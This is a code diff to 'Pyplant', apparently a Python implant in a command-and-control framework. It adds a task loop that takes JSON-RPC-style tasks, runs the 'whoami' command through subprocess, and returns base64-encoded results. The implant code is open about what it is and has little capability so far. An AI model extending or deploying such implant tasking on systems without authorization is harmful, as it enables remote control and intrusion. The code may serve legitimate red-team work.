@@ -1,7 +1,9 @@
 import argparse
+import base64
 import json
 import random
 import requests
+import subprocess
 import threading
 import time
 
@@ -58,7 +60,28 @@ class Pyplant:
             for task in self.batch_request:
                 if not self.verify_task_format(task):
                     continue
-                print(task)
+                task_id = task.get('id')
+                method = task.get('method')
+                params = task.get('params')
+                results = None
+                if method == 'whoami':
+                    results = subprocess.run(['whoami'], capture_output=True, text=True).stdout
+                if not results:
+                    self.batch_response.extend([{
+                        "jsonrpc": "0.0.0",
+                        "error": {
+                            'code': -32601,
+                            'message': f'{method} not found.'
+                        },
+                        "id": task_id
+                    }])
+                    return
+                self.batch_response.extend([{
+                    "jsonrpc": "0.0.0",
+                    "result": self.string_to_base64(results) if results else None,
+                    "id": task_id
+                }])
+                self.batch_request.remove(task)
 
     def setup_parser(self, subparser):
         parser = subparser.add_parser(self.NAME, help='Python Implant for debugging.',
@@ -71,3 +94,22 @@ class Pyplant:
     def verify_task_format(task: dict) -> bool:
         return True
 
+    @staticmethod
+    def base64_to_string(data) -> str:
+        """
+        Base64 decode a string.
+        :param data: A base64 string.
+        :return: A base64 decoded string
+        :rtype: str
+        """
+        return base64.b64decode(data.encode('utf-8')).decode('utf-8')
+
+    @staticmethod
+    def string_to_base64(data) -> str:
+        """
+        Base64 encode a string.
+        :param data: A python string.
+        :return: A base64 encoded string
+        :rtype: str
+        """
+        return str(base64.b64encode(data.encode()), 'utf-8')
